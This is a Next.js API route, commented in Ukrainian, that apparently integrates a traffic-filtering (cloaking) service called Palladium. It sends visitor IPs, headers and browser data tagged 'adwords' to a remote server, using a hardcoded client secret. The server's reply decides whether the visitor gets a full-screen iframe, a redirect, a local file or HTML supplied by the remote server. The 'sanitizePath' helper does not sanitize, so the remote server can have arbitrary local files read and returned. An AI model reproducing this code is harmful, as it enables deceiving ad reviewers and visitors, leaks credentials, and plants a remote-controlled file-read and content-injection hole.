// app/api/palladium/route.ts

import { NextRequest, NextResponse } from "next/server";
import { readFileSync } from "fs";
import path from "path";

// === Налаштування Palladium (замініть на свої дані) ===
const SERVER_URL = "https://rbl.palladium.expert";
const AUTH = {
    clientId: 3024,
    clientCompany: "CQ21WW9U3ehzwXZOKITe",
    clientSecret:
        "MzAyNENRMjFXVzlVM2VoendYWk9LSVRlY2U2NmY2ZTZmOWRlZjUxMGFjNDBiYTJlNjVjMmFjZGEwMTQyZmZhZQ==",
};

// --- Допоміжна функція для побудови query string (аналог http_build_query) ---
function buildQuery(
    obj: Record<string, unknown>,
    prefix: string = ""
): string {
    const parts: string[] = [];
    for (const key in obj) {
        if (Object.prototype.hasOwnProperty.call(obj, key)) {
            const k = prefix
                ? `${prefix}[${encodeURIComponent(key)}]`
                : encodeURIComponent(key);
            const value = obj[key];
            if (value !== null && typeof value === "object") {
                parts.push(buildQuery(value as Record<string, unknown>, k));
            } else {
                parts.push(`${k}=${encodeURIComponent(String(value))}`);
            }
        }
    }
    return parts.join("&");
}

// --- Формування абсолютного шляху для локальних файлів (аналог sanitizePath) ---
function sanitizePath(p: string): string {
    // Використовуємо корінь проекту як базову директорію
    const baseDir = process.cwd();
    return p[0] !== "/" ? path.join(baseDir, p) : path.join(baseDir, p);
}

// --- Перевірка чи шлях є локальним файлом (аналог isLocal) ---
function isLocalFile(filePath: string): boolean {
    return !/^https?:\/\//i.test(filePath);
}

// --- Збір HTTP заголовків (аналог collectHeaders) ---
function collectHeaders(req: NextRequest): Record<string, string> {
    const headerNames = [
        "REMOTE_ADDR",
        "SERVER_PROTOCOL",
        "SERVER_PORT",
        "REMOTE_PORT",
        "QUERY_STRING",
        "REQUEST_SCHEME",
        "REQUEST_URI",
        "REQUEST_TIME_FLOAT",
        "X_FB_HTTP_ENGINE",
        "X_PURPOSE",
        "X_FORWARDED_FOR",
        "X_WAP_PROFILE",
        "X-Forwarded-Host",
        "X-Forwarded-For",
        "X-Frame-Options",
    ];
    const headers: Record<string, string> = {};
    req.headers.forEach((value, key) => {
        if (
            headerNames.includes(key.toUpperCase()) ||
            key.toUpperCase().startsWith("HTTP")
        ) {
            headers[key] = value;
        }
    });
    const url = new URL(req.url);
    headers["REMOTE_ADDR"] = req.headers.get("x-forwarded-for") || "";
    headers["QUERY_STRING"] = url.search.replace(/^\?/, "");
    headers["REQUEST_URI"] = url.pathname + url.search;
    headers["REQUEST_SCHEME"] = url.protocol.replace(":", "");
    headers["SERVER_PROTOCOL"] = "HTTP/1.1";
    headers["SERVER_PORT"] = url.port || (url.protocol === "https:" ? "443" : "80");
    return headers;
}

// --- Збір даних з тіла запиту (аналог collectRequestData) ---
async function collectRequestData(
    req: NextRequest
): Promise<Record<string, unknown>> {
    const data: Record<string, unknown> = {};
    const contentType = req.headers.get("content-type") || "";
    if (contentType.includes("application/json")) {
        const body = await req.json();
        if (body.data) {
            try {
                Object.assign(data, JSON.parse(body.data));
            } catch {
                try {
                    Object.assign(data, JSON.parse(body.data.replace(/\\/g, "")));
                } catch {
                    /* залишається порожнім */
                }
            }
        }
        if (body.crossref_sessionid) {
            data["cr-session-id"] = body.crossref_sessionid;
        }
    } else {
        const textBody = await req.text();
        const params = new URLSearchParams(textBody);
        if (params.has("data")) {
            const d = params.get("data")!;
            try {
                Object.assign(data, JSON.parse(d));
            } catch {
                try {
                    Object.assign(data, JSON.parse(d.replace(/\\/g, "")));
                } catch {
                    /* залишається порожнім */
                }
            }
        }
        if (params.has("crossref_sessionid")) {
            data["cr-session-id"] = params.get("crossref_sessionid")!;
        }
    }
    return data;
}

// --- Збір JS даних (аналог collectJsRequestData) ---
async function collectJsRequestData(
    req: NextRequest
): Promise<Record<string, unknown>> {
    const jsdata: Record<string, unknown> = {};
    const contentType = req.headers.get("content-type") || "";
    if (contentType.includes("application/json")) {
        const body = await req.json();
        if (body.jsdata) {
            try {
                Object.assign(jsdata, JSON.parse(body.jsdata));
            } catch {
                try {
                    Object.assign(jsdata, JSON.parse(body.jsdata.replace(/\\/g, "")));
                } catch {
                    /* залишаємо порожнім */
                }
            }
        }
    } else {
        const textBody = await req.text();
        const params = new URLSearchParams(textBody);
        if (params.has("jsdata")) {
            const d = params.get("jsdata")!;
            try {
                Object.assign(jsdata, JSON.parse(d));
            } catch {
                try {
                    Object.assign(jsdata, JSON.parse(d.replace(/\\/g, "")));
                } catch {
                    /* залишаємо порожнім */
                }
            }
        }
    }
    return jsdata;
}

interface PalladiumReply {
    result?: unknown;
    mode?: number;
    target?: string;
    content?: string;
}

// --- Головна функція API ---
export async function POST(req: NextRequest): Promise<NextResponse> {
    try {
        // Якщо параметр dr_jsess=1, одразу повертаємо 200 OK (тестовий запит)
        const url = new URL(req.url);
        if (url.searchParams.get("dr_jsess") === "1") {
            return new NextResponse(null, { status: 200 });
        }

        const headersData = collectHeaders(req);
        const requestData = await collectRequestData(req);
        const jsRequestData = await collectJsRequestData(req);

        // Формування payload
        const payload = {
            request: requestData,
            jsrequest: jsRequestData,
            server: { ...headersData, bannerSource: "adwords" },
            auth: AUTH,
        };

        const formBody = buildQuery(payload);

        // Встановлюємо таймаут для запиту до сервісу
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 4000);

        const palladiumRes = await fetch(SERVER_URL, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: formBody,
            signal: controller.signal,
        });
        clearTimeout(timeoutId);

        const status = palladiumRes.status;
        const rawResponse = await palladiumRes.text();
        let serverReply: unknown;
        try {
            serverReply = JSON.parse(rawResponse);
        } catch {
            serverReply = null;
        }

        if (
            status !== 200 ||
            typeof serverReply !== "object" ||
            serverReply === null
        ) {
            return new NextResponse(`Error: ${rawResponse}`, { status: 500 });
        }

        const reply = serverReply as PalladiumReply;
        const resultFlag = !!reply.result;
        let mode = reply.mode;
        const target = reply.target;
        const content = reply.content;

        // Якщо target є URL, а режим 3 – переключаємо на mode 2 (редирект)
        if (typeof target === "string" && /^https?:/i.test(target) && mode === 3) {
            mode = 2;
        }

        if (resultFlag && mode === 1) {
            // Mode 1: повертаємо HTML з iframe
            const safeTarget = target ? target.replace(/"/g, "&quot;") : "";
            const html = `<html>
        <head>
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
        </head>
        <body>
          <iframe src="${safeTarget}" style="width:100%; height:100%; position:absolute; top:0; left:0; z-index:999999; border:none;"></iframe>
        </body>
      </html>`;
            return new NextResponse(html, {
                headers: { "Content-Type": "text/html" },
            });
        } else if (resultFlag && mode === 2) {
            // Mode 2: редирект
            return NextResponse.redirect(target as string);
        } else if (resultFlag && mode === 3) {
            // Mode 3: завантаження локального файлу
            if (typeof target !== "string") {
                return new NextResponse("Invalid target for mode 3", { status: 500 });
            }
            const parsedUrl = new URL(target, "http://dummy");
            const filePath = sanitizePath(parsedUrl.pathname);
            try {
                const fileContent = readFileSync(filePath, "utf-8");
                return new NextResponse(fileContent, {
                    headers: { "Content-Type": "text/html" },
                });
            } catch (err: unknown) {
                const message =
                    err instanceof Error ? err.message : String(err);
                return new NextResponse(`File error: ${message}`, { status: 500 });
            }
        } else if (resultFlag && mode === 4) {
            // Mode 4: повертаємо HTML контент, який повернув сервіс
            return new NextResponse(content || "", {
                headers: { "Content-Type": "text/html" },
            });
        } else {
            // Фолбек: спроба завантажити локальний файл
            if (target && isLocalFile(String(target))) {
                const filePath = sanitizePath(String(target));
                try {
                    const fileContent = readFileSync(filePath, "utf-8");
                    return new NextResponse(fileContent, {
                        headers: { "Content-Type": "text/html" },
                    });
                } catch {
                    return new NextResponse("Not Found", { status: 404 });
                }
            }
            return new NextResponse("500 Internal Server Error", { status: 500 });
        }
    } catch (error: unknown) {
        const message = error instanceof Error ? error.message : String(error);
        return new NextResponse(`500 Internal Server Error: ${message}`, { status: 500 });
    }
}
